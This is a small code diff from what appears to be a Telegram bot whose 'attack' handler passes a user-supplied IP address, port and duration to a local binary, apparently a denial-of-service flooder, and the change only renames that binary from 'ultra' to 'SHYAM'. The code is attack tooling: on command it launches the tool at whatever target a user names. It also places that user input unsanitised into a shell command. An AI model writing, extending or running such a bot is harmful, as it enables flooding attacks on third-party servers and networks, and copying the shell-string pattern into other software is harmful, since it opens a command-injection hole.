@@ -142,9 +142,9 @@ async def attack(update: Update, context: CallbackContext):
 # Run the actual attack or simulate it
 async def run_attack(chat_id, ip, port, duration, context):
     try:
-        # Assuming `./ultra` is a command in the same directory
+        # Assuming `./SHYAM` is a command in the same directory
         process = await asyncio.create_subprocess_shell(
-            f"./ultra {ip} {port} {duration} 05",
+            f"./SHYAM {ip} {port} {duration} 05",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
